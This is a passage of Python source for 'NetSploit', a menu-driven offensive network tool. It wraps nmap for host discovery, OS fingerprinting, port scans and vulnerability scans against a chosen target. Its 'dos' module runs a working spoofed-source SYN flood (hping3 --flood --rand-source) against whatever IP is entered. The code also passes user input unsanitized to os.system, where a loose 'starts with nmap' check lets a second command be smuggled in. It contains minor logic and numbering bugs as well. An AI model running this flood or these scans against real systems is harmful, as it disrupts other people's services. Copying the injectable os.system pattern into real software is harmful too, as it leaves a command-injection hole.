    prompt_input = input(yellow('netsploit', 'underlined') + ' ' + green('>') + ' ')  # noqa

    args = prompt_input.split()
    argsLength = len(args)

    if argsLength == 0:
        # error_message('Please enter a valid command.')
        prompt(
        )
    else:
        if args[0] == 'use':
            try:
                if args[1] == 'network-scanner':
                    print()
                    info_message(f'Selected {green("network-scanner", "bold")} module.')  # noqa
                    print(""" \033[1;36m
╒═════════════════════════════════════════════════════════════════╕
│                                                                 │
│                         Network Scanner                         │
│                                                                 │
│      Find devices connected to the network and retrieve         │
│                basic information about them                     │
╘═════════════════════════════════════════════════════════════════╛     \033[1;m""")  # noqa
                    print()
                    network_scanner()

                elif args[1] == 'device-info':
                    print()
                    info_message(f'Selected {green("device-info", "bold")} module')  # noqa
                    print(""" \033[1;36m
╒═════════════════════════════════════════════════════════════════╕
│                                                                 │
│                         Device Info                             │
│                                                                 │
│      Use a series of scans to gather information about          │
│                      the target device                          │
╘═════════════════════════════════════════════════════════════════╛     \033[1;m""")  # noqa
                    print()
                    device_info()

                elif args[1] == 'os-guesser':
                    print()
                    info_message(f'Selected {green("os-guesser", "bold")} module')  # noqa
                    print(""" \033[1;36m
╒═════════════════════════════════════════════════════════════════╕
│                                                                 │
│                          OS Guesser                             │
│                                                                 │
│      Use a series of scans to gather information such as        │
│      the operating system the target is running, the version    │
│                of the operating system, etc.                    │
╘═════════════════════════════════════════════════════════════════╛     \033[1;m""")  # noqa
                    print()
                    os_guesser()

                elif args[1] == 'oui-lookup':
                    print()
                    info_message(f'Selected {green("oui-lookup", "bold")} module')  # noqa
                    print(""" \033[1;36m
╒═════════════════════════════════════════════════════════════════╕
│                                                                 │
│                          OUI Lookup                             │
│                                                                 │
│      Find the manufacturer of the target device using its       │
│                          MAC Address.                           │
╘═════════════════════════════════════════════════════════════════╛     \033[1;m""")  # noqa
                    print()
                    oui_lookup()

                elif args[1] == 'port-scanner':
                    print()
                    info_message(
                        f'Selected {green("port-scanner", "bold")} module')
                    print(""" \033[1;36m
╒═════════════════════════════════════════════════════════════════╕
│                                                                 │
│                          Port Scanner                           │
│                                                                 │
│             Scan the target device for open ports               │
╘═════════════════════════════════════════════════════════════════╛     \033[1;m""")  # noqa
                    print()
                    port_scanner()

                elif args[1] == 'dos':
                    print()
                    info_message(f'Selected {green("dos", "bold")} module')
                    print(""" \033[1;36m
╒═════════════════════════════════════════════════════════════════╕
│                                                                 │
│                           DoS Attack                            │
│     Send a succession of SYN requests to the target system      │
│     to make the system unresponsive to legitimate traffic       │
╘═════════════════════════════════════════════════════════════════╛     \033[1;m""")  # noqa
                    print()
                    dos()

                elif args[1] == 'ping':
                    print()
                    info_message(f'Selected {green("ping", "bold")} module')
                    print(""" \033[1;36m
╒═════════════════════════════════════════════════════════════════╕
│                                                                 │
│                              Ping                               │
│                                                                 │
│                Check the accessibility of devices               │
│      and show how long it takes for packets to reach host       │
╘═════════════════════════════════════════════════════════════════╛     \033[1;m""")  # noqa
                    print()
                    ping()

                elif args[1] == 'vuln-scanner':
                    print()
                    info_message(f'Selected {green("vuln-scannner", "bold")} module')  # noqa
                    print(""" \033[1;36m
╒═════════════════════════════════════════════════════════════════╕
│                                                                 │
│                      Vulnerability Scanner                      │
│                                                                 │
│          Scan the target for potential vulnerabilities          │
│                     that can be exploited                       │
╘═════════════════════════════════════════════════════════════════╛     \033[1;m""")  # noqa
                    print()
                    vuln_scanner()

                elif args[1] == 'custom':
                    print()
                    info_message(f'Selected {green("custom", "bold")} module')
                    print()
                    custom()

            except IndexError:
                error_message('Please enter a valid module name. Example:', 'use network-scanner')  # noqa
                prompt()
            else:
                error_message(
                    'Please enter a valid module name. Example:', 'use network-scanner')  # noqa
                prompt()

        elif args[0] == 'exit':
            exit()

        elif args[0] == 'clear':
            os.system('clear')
            prompt()

        elif args[0] == '':
            prompt()

        elif args[0] == 'modules':
            print()
            print(f'{yellow("Modules:", ["bold", "underlined"])}')
            # print(f'  {cyan("network-scanner", "bold")}, {cyan("device-info", "bold")}, {cyan("oui-lookup", "bold")}, {cyan("os-guesser", "bold")}, {cyan("port-scanner", "bold")}, {cyan("dos", "bold")}, {cyan("ping", "bold")}, {cyan("vuln-scanner", "bold")}')  # noqa
            modulesTable = [["", "Module", "Information", "Options"],
                        ['1', 'network-scanner', 'Find devices connected to the network', '(none)'],  # noqa
                        ['2', 'device-info', 'Get info about a device', 'TARGET'],  # noqa
                        ['3', 'oui-lookup', 'Find the manufacturer of target with OUI', '<prompt>: OUI'],  # noqa
                        ['4', 'os-guesser', 'Guess the OS running on target device', 'TARGET'],  # noqa
                        ['5', 'port-scanner', 'Scan the target device for open ports', 'TARGET'],  # noqa
                        ['6', 'dos', 'Run a Denial-Of-Service attack on the target', 'TARGET'],  # noqa
                        ['5', 'ping', 'Ping the target to see if they are online', '<prompt>: TARGET'],  # noqa
                        ['6', 'vuln-scanner', 'Scan the target for vulnerabilities', 'TARGET']]  # noqa

            print(tabulate(modulesTable, stralign="left",
                           tablefmt="fancy_grid", headers="firstrow"))
            # print()
            # info_message('"TARGET" option is the [local] IP Address of the target device')  # noqa
            # info_message('"OUI" option is the first 3 parts of the MAC Address of the target device.')  # noqa
            # info_message('Run "use <module>" to use a module. (Replace <module> with the name of the module you want to use)')  # noqa

            print()
            prompt()

        elif args[0] == 'help':
            print()
            print(f'{cyan("Commands", ["bold", "underlined"])}:')
            print(f'  {yellow("help", "bold")}            |  {green("Print this help message", "italic")}')  # noqa
            print(f'  {yellow("use", "bold")} <module>    |  {green("Select a module to use", "italic")}')  # noqa
            print(f'  {yellow("modules", "bold")}         |  {green("Show available modules to use", "italic")}')  # noqa
            print(f'  {yellow("shell", "bold")}           |  {green("Run a shell command", "italic")}')  # noqa
            print(f'  {yellow("clear", "bold")}           |  {green("Clear the [terminal] screen", "italic")}')  # noqa
            print(f'  {yellow("exit", "bold")}            |  {green("Exit the program", "italic")}')  # noqa
            print()
            prompt()

        elif args[0] == 'shell':
            shell()

        elif args[0] == 'auto':
            print()
            success_message('NetSploit is now running in auto mode')
            net = str(os.popen("ip route show | grep -i 'default via'| awk '{print $3 }'").read())  # noqa // Get LAN ip address. eg:  192.168.0.2\n
            net = net.replace("\n", "")  # Remove newline from `net`. eg: 192.168.0.2  # noqa
            net2 = net[:-1]  # Remove last character from `net`. eg: 192.168.0.
            net3 = net2 + "0"  # Add zero (0) to the end of the `net2`. eg: 192.168.0.  # noqa
            net4 = net3 + "/24"  # Add /24 to the end of `net3`. eg: 192.168.0.0/24  # noqa
            IP_RANGE = net4
            info_message(f'Running network scan on {IP_RANGE}...')
            # if IP_RANGE is False:  # If IP_RANGE is False, AKA, not set:
            #     error_message('Cannot start scan without IP_RANGE. Set the IP_RANGE using:', 'IP_RANGE => Your-IP-range-here')  # noqa
            #     network_scanner()  # Show the network scanner prompt
            # info_message(f'Running network scan with IP range {IP_RANGE}, this may take up to two minutes')  # noqa
            info_message('Running a network scan properly requires the command to be run using sudo')  # noqa
            print()
            os.system(f'sudo nmap -sn -T4 {IP_RANGE}')
            print()
            success_message('Finished scanning network.')
            print()
            target_device = input(f'[{green(">", "bold")}] {cyan("Enter target device IP: ", "bold")}')  # noqa
            if target_device:
                print()
                print(f'{yellow("Available scans/attacks:", ["underlined", "bold"])}\n\n  1 - Device Info\n  2 - OS Guesser\n  3 - Port Scanner\n  4 - DoS Attack\n  5 - Ping\n  6 - Vulnerability Scan\n  7 - Custom nmap command')  # noqa
                print()

                choice = str(input(f'[{green(">", "bold")}] {cyan("Enter scan/attack to run on", "bold")} {yellow(target_device, "bold")}: '))  # noqa
                if choice == '1':
                    print()
                    info_message(f'Selected {green("device-info", "bold")} module')  # noqa
                    print(""" \033[1;36m
╒═════════════════════════════════════════════════════════════════╕
│                                                                 │
│                         Device Info                             │
│                                                                 │
│      Use a series of scans to gather information about          │
│                      the target device                          │
╘═════════════════════════════════════════════════════════════════╛     \033[1;m""")  # noqa
                    print()
                    time.sleep(1)
                    info_message(f'Running device scan on {target_device}, this may take up to two minutes')  # noqa
                    info_message('Running a device scan properly requires the command to be run using sudo')  # noqa
                    print()
                    os.system(f'sudo nmap -v -A -T4 {target_device} -Pn')
                    print()
                    success_message(f'Finished scanning {target_device}')
                    print()
                    info_message('Exited auto mode')
                    print()
                    prompt()

                elif choice == '2':
                    print()
                    info_message(f'Selected {green("os-guesser", "bold")} module')  # noqa
                    print(""" \033[1;36m
╒═════════════════════════════════════════════════════════════════╕
│                                                                 │
│                          OS Guesser                             │
│                                                                 │
│      Use a series of scans to gather information such as        │
│      the operating system the target is running, the version    │
│                of the operating system, etc.                    │
╘═════════════════════════════════════════════════════════════════╛     \033[1;m""")  # noqa
                    print()
                    time.sleep(1)
                    info_message(f'Running OS Guesser scan on {target_device}, this may take up to two minutes')  # noqa
                    info_message('Running a OS Guesser scan properly requires the command to be run using sudo')  # noqa
                    print()
                    os.system(f'sudo nmap -T4 -O --osscan-guess {target_device} -Pn')  # noqa
                    print()
                    success_message(f'Finished scanning {target_device}')
                    print()
                    info_message('Exited auto mode')
                    print()
                    prompt()

                elif choice == '3':
                    print()
                    info_message(
                        f'Selected {green("port-scanner", "bold")} module')
                    print(""" \033[1;36m
╒═════════════════════════════════════════════════════════════════╕
│                                                                 │
│                          Port Scanner                           │
│                                                                 │
│             Scan the target device for open ports               │
╘═════════════════════════════════════════════════════════════════╛     \033[1;m""")  # noqa
                    print()
                    time.sleep(1)
                    info_message(f'Running port scan on {target_device}, this may take up to two minutes')  # noqa
                    print()
                    os.system(f'nmap -T4 -sV {target_device} -Pn')
                    print()
                    success_message(f'Finished scanning {target_device}')
                    print()
                    info_message('Exited auto mode')
                    print()
                    prompt()

                elif choice == '4':
                    print()
                    info_message(f'Selected {green("dos", "bold")} module')
                    print(""" \033[1;36m
╒═════════════════════════════════════════════════════════════════╕
│                                                                 │
│                           DoS Attack                            │
│     Send a succession of SYN requests to the target system      │
│     to make the system unresponsive to legitimate traffic       │
╘═════════════════════════════════════════════════════════════════╛     \033[1;m""")  # noqa
                    time.sleep(1)
                    print()
                    info_message(f'Running DoS attack on {target_device}, this may take up to two minutes')  # noqa
                    info_message('Running a DoS attack properly requires the command to be run using sudo')  # noqa
                    print()
                    os.system(f'sudo hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source {target_device}')  # noqa
                    print()
                    success_message(f'Finished attacking {target_device}')
                    print()
                    info_message('Exited auto mode')
                    print()
                    prompt()

                elif choice == '5':
                    print()
                    info_message(f'Selected {green("ping", "bold")} module')
                    print(""" \033[1;36m
╒═════════════════════════════════════════════════════════════════╕
│                                                                 │
│                              Ping                               │
│                                                                 │
│                Check the accessibility of devices               │
│      and show how long it takes for packets to reach host       │
╘═════════════════════════════════════════════════════════════════╛     \033[1;m""")  # noqa
                    time.sleep(1)
                    print()
                    info_message(f'Pinging {target_device} (5 times)...\n')
                    os.system(f'ping -c 5 {target_device}')
                    print()
                    success_message(f'Finished pinging {target_device}\n')
                    print()
                    info_message('Exited auto mode.')
                    print()
                    prompt()

                elif choice == '6':
                    print()
                    info_message(f'Selected {green("vuln-scannner", "bold")} module')  # noqa
                    print(""" \033[1;36m
╒═════════════════════════════════════════════════════════════════╕
│                                                                 │
│                      Vulnerability Scanner                      │
│                                                                 │
│          Scan the target for potential vulnerabilities          │
│                     that can be exploited                       │
╘═════════════════════════════════════════════════════════════════╛     \033[1;m""")  # noqa
                    time.sleep(1)
                    print()
                    info_message(f'Running Vulnerability scan on {target_device}, this may take up to two minutes')  # noqa
                    # info_message('Running a DoS attack properly requires the command to be run using sudo')  # noqa
                    print()
                    # os.system(f'sudo hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source {TARGET}')  # noqa
                    os.system(f'nmap --script nmap-vulners/ -sV -T4 {target_device}')  # noqa
                    print()
                    success_message(f'Finished scanning {target_device}')
                    print()
                    info_message('Exited auto mode.')
                    print()
                    prompt()

                elif choice == '7':
                    print()
                    info_message(f'Selected {green("custom", "bold")} module')
                    print()
                    custom_nmap_cmd = input(f'[{green(">", "bold")}] {cyan("Enter custom nmap command to run: ", "bold")}')  # noqa
                    if custom_nmap_cmd.startswith('nmap'):
                        print()
                        success_message(
                            f'Running custom nmap command "{custom_nmap_cmd}"')
                        print()
                        os.system(custom_nmap_cmd)
                        print()
                        info_message('Exited auto mode.')
                        print()
                        prompt()
                    else:
                        print()
                        error_message(f'Your command must be an nmap command! To run any other shell command, use the {yellow("shell", "bold")} (netsploit) command.')  # noqa
                        print()
                        info_message('Exited auto mode.')
                        print()
                        prompt()
                else:
                    error_message('Error: you did not provide a valid scan / attack.')  # noqa

            else:
                error_message('Error: you did not provide a target device IP.')
                prompt()

        else:
            error_message(
                f'Invalid command: "{args[0]}". Please enter a valid command.')
            prompt()


try:
    prompt()
except KeyboardInterrupt:
    print()
    exit()
